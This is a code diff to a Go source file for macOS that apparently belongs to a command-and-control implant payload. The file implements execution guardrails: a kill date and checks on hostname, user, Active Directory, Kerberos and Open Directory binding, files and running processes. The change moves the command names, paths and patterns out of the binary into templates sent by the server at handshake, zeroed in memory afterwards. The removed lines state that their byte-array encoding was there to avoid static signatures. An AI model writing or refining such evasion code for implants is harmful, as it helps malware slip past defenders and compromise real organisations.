@@ -1,4 +1,4 @@
-// server/docker/payloads/Darwin/safety_checks.go
+// server/docker/payloads/Darwin/exec_requirements_darwin.go
 //go:build darwin
 // +build darwin
 
@@ -68,47 +68,83 @@ func clearString(s *string) {
 	*s = ""
 }
 
-// Exec requirements strings (constructed to avoid static signatures)
-var (
-	// Command names
-	erCmdScutil     = string([]byte{0x73, 0x63, 0x75, 0x74, 0x69, 0x6c})                                                                                     // scutil
-	erCmdDsconfigad = string([]byte{0x64, 0x73, 0x63, 0x6f, 0x6e, 0x66, 0x69, 0x67, 0x61, 0x64})                                                             // dsconfigad
-	erCmdDscl       = string([]byte{0x64, 0x73, 0x63, 0x6c})                                                                                                 // dscl
-	erCmdPs         = string([]byte{0x70, 0x73})                                                                                                             // ps
-	erCmdPgrep      = string([]byte{0x70, 0x67, 0x72, 0x65, 0x70})                                                                                           // pgrep
+// ExecReqTemplate stores exec requirements template strings received from server
+type ExecReqTemplate struct {
+	Version   int      `json:"v"`
+	Type      int      `json:"t"`
+	Templates []string `json:"tpl"`
+	Params    []string `json:"p"`
+}
 
-	// Command arguments
-	erArgGet          = string([]byte{0x2d, 0x2d, 0x67, 0x65, 0x74})                                                                                         // --get
-	erArgLocalHost    = string([]byte{0x4c, 0x6f, 0x63, 0x61, 0x6c, 0x48, 0x6f, 0x73, 0x74, 0x4e, 0x61, 0x6d, 0x65})                                         // LocalHostName
-	erArgShow         = string([]byte{0x2d, 0x73, 0x68, 0x6f, 0x77})                                                                                         // -show
-	erArgLocalhost    = string([]byte{0x6c, 0x6f, 0x63, 0x61, 0x6c, 0x68, 0x6f, 0x73, 0x74})                                                                 // localhost
-	erArgList         = string([]byte{0x2d, 0x6c, 0x69, 0x73, 0x74})                                                                                         // -list
-	erArgActiveDir    = string([]byte{0x2f, 0x41, 0x63, 0x74, 0x69, 0x76, 0x65, 0x20, 0x44, 0x69, 0x72, 0x65, 0x63, 0x74, 0x6f, 0x72, 0x79})                 // /Active Directory
-	erArgRead         = string([]byte{0x2d, 0x72, 0x65, 0x61, 0x64})                                                                                         // -read
-	erArgSlash        = string([]byte{0x2f})                                                                                                                 // /
-	erArgAux          = string([]byte{0x61, 0x75, 0x78})                                                                                                     // aux
-	erArgCaseI        = string([]byte{0x2d, 0x69})                                                                                                           // -i
+// Exec requirements template indices - must match server's common.go
+const (
+	// Command names (Darwin-specific)
+	idxExecReqCmdScutil     = 400
+	idxExecReqCmdDsconfigad = 401
+	idxExecReqCmdDscl       = 402
+	idxExecReqCmdPs         = 403
+	idxExecReqCmdPgrep      = 404
+
+	// Command arguments (Darwin-specific)
+	idxExecReqArgGet       = 405
+	idxExecReqArgLocalHost = 406
+	idxExecReqArgShow      = 407
+	idxExecReqArgLocalhost = 408
+	idxExecReqArgList      = 409
+	idxExecReqArgActiveDir = 410
+	idxExecReqArgRead      = 411
+	idxExecReqArgSlash     = 412
+	idxExecReqArgAux       = 413
+	idxExecReqArgCaseI     = 414
 
 	// Environment variable names
-	erEnvUser    = string([]byte{0x55, 0x53, 0x45, 0x52})                                                                                                   // USER
-	erEnvLogname = string([]byte{0x4c, 0x4f, 0x47, 0x4e, 0x41, 0x4d, 0x45})                                                                                 // LOGNAME
+	idxExecReqEnvUser    = 415
+	idxExecReqEnvLogname = 416
 
-	// File paths
-	erPathKrb5Conf    = string([]byte{0x2f, 0x65, 0x74, 0x63, 0x2f, 0x6b, 0x72, 0x62, 0x35, 0x2e, 0x63, 0x6f, 0x6e, 0x66})                                   // /etc/krb5.conf
-	erPathMitKerberos = string([]byte{0x2f, 0x4c, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x2f, 0x50, 0x72, 0x65, 0x66, 0x65, 0x72, 0x65, 0x6e, 0x63, 0x65, 0x73, 0x2f, 0x65, 0x64, 0x75, 0x2e, 0x6d, 0x69, 0x74, 0x2e, 0x4b, 0x65, 0x72, 0x62, 0x65, 0x72, 0x6f, 0x73}) // /Library/Preferences/edu.mit.Kerberos
-	erPathTildeFwd    = string([]byte{0x7e, 0x2f})                                                                                                           // ~/
+	// File paths (Darwin-specific)
+	idxExecReqPathKrb5Conf    = 417
+	idxExecReqPathMitKerberos = 418
+	idxExecReqPathTildeFwd    = 419
 
-	// String patterns
-	erPatternADDomain   = string([]byte{0x41, 0x63, 0x74, 0x69, 0x76, 0x65, 0x20, 0x44, 0x69, 0x72, 0x65, 0x63, 0x74, 0x6f, 0x72, 0x79, 0x20, 0x44, 0x6f, 0x6d, 0x61, 0x69, 0x6e}) // Active Directory Domain
-	erPatternDefRealm   = string([]byte{0x64, 0x65, 0x66, 0x61, 0x75, 0x6c, 0x74, 0x5f, 0x72, 0x65, 0x61, 0x6c, 0x6d})                                       // default_realm
-	erPatternServerConn = string([]byte{0x53, 0x65, 0x72, 0x76, 0x65, 0x72, 0x43, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e})                     // ServerConnection
+	// String patterns (Darwin-specific)
+	idxExecReqPatternADDomain   = 420
+	idxExecReqPatternDefRealm   = 421
+	idxExecReqPatternServerConn = 422
 
 	// String literals
-	erWordTrue = string([]byte{0x74, 0x72, 0x75, 0x65})                                                                                                     // true
+	idxExecReqWordTrue    = 423
+	idxExecReqTimeFmtFull = 424
 
-	// Time format strings
-	erTimeFmtFull = string([]byte{0x32, 0x30, 0x30, 0x36, 0x2d, 0x30, 0x31, 0x2d, 0x30, 0x32, 0x20, 0x31, 0x35, 0x3a, 0x30, 0x34, 0x3a, 0x30, 0x35})       // 2006-01-02 15:04:05
+	// Environment variable names (additional)
+	idxExecReqEnvHostname = 320
+	idxExecReqEnvShell    = 321
+
+	// System info strings (for getSystemInfo.go)
+	idxExecReqSysInfoStartupTime  = 322
+	idxExecReqSysInfoStatusActive = 323
 )
+
+// Global exec req template storage (uses SecureTemplate for memory zeroing)
+var globalExecReqTpl *SecureTemplate
+
+// setExecReqTemplate stores the exec requirements template (converts to SecureTemplate)
+func setExecReqTemplate(tpl *ExecReqTemplate) {
+	// Zero old template before replacing
+	if globalExecReqTpl != nil {
+		globalExecReqTpl.Zero()
+	}
+	globalExecReqTpl = NewSecureTemplateFromSlices(tpl.Version, tpl.Type, tpl.Templates, tpl.Params)
+}
+
+// erTpl safely retrieves a template string by index
+func erTpl(idx int) string {
+	return globalExecReqTpl.Get(idx)
+}
+
+// getErStr gets exec req string from template (no fallbacks - templates sent during handshake)
+func getErStr(idx int) string {
+	return erTpl(idx)
+}
 
 // PerformSafetyChecks runs all configured safety checks
 // Returns true if all checks pass, false otherwise
@@ -153,7 +189,7 @@ func PerformSafetyChecks() bool {
 	if safetyFilePath != "" {
 		path := decryptSafetyValue(safetyFilePath)
 		mustExistVal := decryptSafetyValue(safetyFileMustExist)
-		mustExist := mustExistVal == erWordTrue
+		mustExist := mustExistVal == getErStr(idxExecReqWordTrue)
 		result := checkFile(path, mustExist)
 		clearString(&path)
 		clearString(&mustExistVal)
@@ -217,7 +253,7 @@ func checkHostname(expected string) bool {
 
 	// Also check using scutil for local hostname
 	if !strings.EqualFold(hostname, expected) {
-		cmd := exec.Command(erCmdScutil, erArgGet, erArgLocalHost)
+		cmd := exec.Command(getErStr(idxExecReqCmdScutil), getErStr(idxExecReqArgGet), getErStr(idxExecReqArgLocalHost))
 		output, err := cmd.Output()
 		if err == nil {
 			hostname = strings.TrimSpace(string(output))
@@ -233,9 +269,9 @@ func checkUsername(expected string) bool {
 	currentUser, err := user.Current()
 	if err != nil {
 		// Fallback to environment variable
-		username := os.Getenv(erEnvUser)
+		username := os.Getenv(getErStr(idxExecReqEnvUser))
 		if username == "" {
-			username = os.Getenv(erEnvLogname)
+			username = os.Getenv(getErStr(idxExecReqEnvLogname))
 		}
 		return strings.EqualFold(username, expected)
 	}
@@ -279,7 +315,7 @@ func checkDomain(expected string) bool {
 
 // checkADDomainDSConfig checks Active Directory binding using dsconfigad
 func checkADDomainDSConfig() string {
-	cmd := exec.Command(erCmdDsconfigad, erArgShow)
+	cmd := exec.Command(getErStr(idxExecReqCmdDsconfigad), getErStr(idxExecReqArgShow))
 	output, err := cmd.Output()
 	if err != nil {
 		return ""
@@ -289,7 +325,7 @@ func checkADDomainDSConfig() string {
 	for _, line := range lines {
 		line = strings.TrimSpace(line)
 		// Look for "Active Directory Domain = domain.com"
-		if strings.HasPrefix(line, erPatternADDomain) {
+		if strings.HasPrefix(line, getErStr(idxExecReqPatternADDomain)) {
 			parts := strings.Split(line, "=")
 			if len(parts) > 1 {
 				return strings.TrimSpace(parts[1])
@@ -302,7 +338,7 @@ func checkADDomainDSConfig() string {
 
 // checkADDomainDSCL checks Active Directory using dscl
 func checkADDomainDSCL() string {
-	cmd := exec.Command(erCmdDscl, erArgLocalhost, erArgList, erArgActiveDir)
+	cmd := exec.Command(getErStr(idxExecReqCmdDscl), getErStr(idxExecReqArgLocalhost), getErStr(idxExecReqArgList), getErStr(idxExecReqArgActiveDir))
 	output, err := cmd.Output()
 	if err != nil {
 		return ""
@@ -321,8 +357,8 @@ func checkADDomainDSCL() string {
 func checkKerberosRealm() string {
 	// Check /etc/krb5.conf
 	configPaths := []string{
-		erPathKrb5Conf,
-		erPathMitKerberos,
+		getErStr(idxExecReqPathKrb5Conf),
+		getErStr(idxExecReqPathMitKerberos),
 	}
 
 	for _, path := range configPaths {
@@ -330,7 +366,7 @@ func checkKerberosRealm() string {
 			lines := strings.Split(string(data), "\n")
 			for _, line := range lines {
 				line = strings.TrimSpace(line)
-				if strings.HasPrefix(strings.ToLower(line), erPatternDefRealm) {
+				if strings.HasPrefix(strings.ToLower(line), getErStr(idxExecReqPatternDefRealm)) {
 					if strings.Contains(line, "=") {
 						parts := strings.Split(line, "=")
 						if len(parts) > 1 {
@@ -347,7 +383,7 @@ func checkKerberosRealm() string {
 
 // checkOpenDirectory checks if bound to Open Directory
 func checkOpenDirectory() string {
-	cmd := exec.Command(erCmdDscl, erArgLocalhost, erArgRead, erArgSlash)
+	cmd := exec.Command(getErStr(idxExecReqCmdDscl), getErStr(idxExecReqArgLocalhost), getErStr(idxExecReqArgRead), getErStr(idxExecReqArgSlash))
 	output, err := cmd.Output()
 	if err != nil {
 		return ""
@@ -356,7 +392,7 @@ func checkOpenDirectory() string {
 	// Parse output for Open Directory server
 	lines := strings.Split(string(output), "\n")
 	for _, line := range lines {
-		if strings.Contains(line, erPatternServerConn) {
+		if strings.Contains(line, getErStr(idxExecReqPatternServerConn)) {
 			// Extract server name
 			parts := strings.Fields(line)
 			if len(parts) > 1 {
@@ -371,7 +407,7 @@ func checkOpenDirectory() string {
 // checkFile verifies file existence based on the requirement
 func checkFile(path string, mustExist bool) bool {
 	// Expand ~ to home directory if present
-	if strings.HasPrefix(path, erPathTildeFwd) {
+	if strings.HasPrefix(path, getErStr(idxExecReqPathTildeFwd)) {
 		if home, err := os.UserHomeDir(); err == nil {
 			path = filepath.Join(home, path[2:])
 		}
@@ -402,7 +438,7 @@ func checkProcess(processName string) bool {
 // checkProcessViaPS uses the ps command to check for processes
 func checkProcessViaPS(processName string) bool {
 	// Use ps with wide output to avoid truncation
-	cmd := exec.Command(erCmdPs, erArgAux)
+	cmd := exec.Command(getErStr(idxExecReqCmdPs), getErStr(idxExecReqArgAux))
 	output, err := cmd.Output()
 	if err != nil {
 		return false
@@ -416,7 +452,7 @@ func checkProcessViaPS(processName string) bool {
 	}
 
 	// Also check using pgrep for exact matches
-	cmd = exec.Command(erCmdPgrep, erArgCaseI, processName)
+	cmd = exec.Command(getErStr(idxExecReqCmdPgrep), getErStr(idxExecReqArgCaseI), processName)
 	if err := cmd.Run(); err == nil {
 		return true
 	}
@@ -460,7 +496,7 @@ func checkProcessGopsutil(processName string) bool {
 // checkKillDate verifies the current date is before the kill date
 func checkKillDate(killDateStr string) bool {
 	// Parse kill date (format: "2006-01-02 15:04:05")
-	killDate, err := time.Parse(erTimeFmtFull, killDateStr)
+	killDate, err := time.Parse(getErStr(idxExecReqTimeFmtFull), killDateStr)
 	if err != nil {
 		// If we can't parse the kill date, fail safe and don't run
 		return false
